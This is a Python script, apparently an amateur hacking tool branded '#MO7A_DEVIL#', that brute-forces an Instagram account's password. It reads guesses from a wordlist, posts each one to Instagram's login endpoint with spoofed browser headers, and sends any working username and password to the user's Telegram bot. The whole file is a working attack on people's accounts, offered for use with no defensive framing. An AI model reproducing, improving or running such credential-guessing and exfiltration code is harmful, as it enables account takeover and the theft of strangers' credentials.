import requests
import time
import random
import string
import webbrowser

#colors
BLACK   = '\033[30m'
RED     = '\033[31m'
GREEN   = '\033[32m'
YELLOW  = '\033[33m'
BLUE    = '\033[34m'
MAGENTA = '\033[35m'
CYAN    = '\033[36m'
WHITE   = '\033[37m'
RESET   = '\033[39m'

session = requests.Session()
webbrowser.open('https://www.instagram.com/thisismo7a/')
           
import pyfiglet

yso = pyfiglet.figlet_format('#MO7A_DEVIL#')

print(RED+yso)



user_name = input(f'''Enter Account UserName ({YELLOW}?{WHITE}){WHITE} : ''')

id_tele = input(f'''Enter Your Telegram ID ({YELLOW}?{WHITE}){WHITE} : ''')

token_bot = input(f'''Enter Your Telegram Token bot ({YELLOW}?{WHITE}){WHITE} : ''')

pass_word = input(f'''Enter Your Password List Name ({YELLOW}?{WHITE}){WHITE} : ''')

file = open(f"{pass_word}", "r")

def GuessInstagram():
    while True:

        pass_word = file.readline().split('\n')[0]

        url = "https://www.instagram.com/accounts/login/ajax/"

        headers = {
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) InspectBrowser',
            'X-CSRFToken': 'TNZhAQCH8OaoK8F5oZNHJ5ZrkAlSmcMM',
            'X-Instagram-AJAX': 'cec4fe0d7efe',
            'X-IG-App-ID': '936619743392459'
        }

        tim = str(time.time()).split(".")[1]

        data = {
            'username': f'{user_name}',
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{tim}:{pass_word}',
            'queryParams': {},
            'optIntoOneTap': 'false'
        }



        req = session.post(url, headers=headers, data=data).text


        if ('"authenticated":true') in req:
            print(GREEN+f'User:{user_name}Pass:{pass_word} Correct Password ✓')



            telegram_sand =(f'https://api.telegram.org/bot{token_bot}/sendMessage?chat_id={id_tele}&text=Correct Password ✔\nUser:{user_name}Pass:{pass_word}')

            req = requests.post(telegram_sand)


        
        elif '"checkpoint_url"' in req:
            print(YELLOW+'Temporary Band or Secure Account ):')



        else:
            print(RED+f'User:{user_name}Pass:{pass_word} Wrong Password ✘')
        
        time.sleep(10)

GuessInstagram()
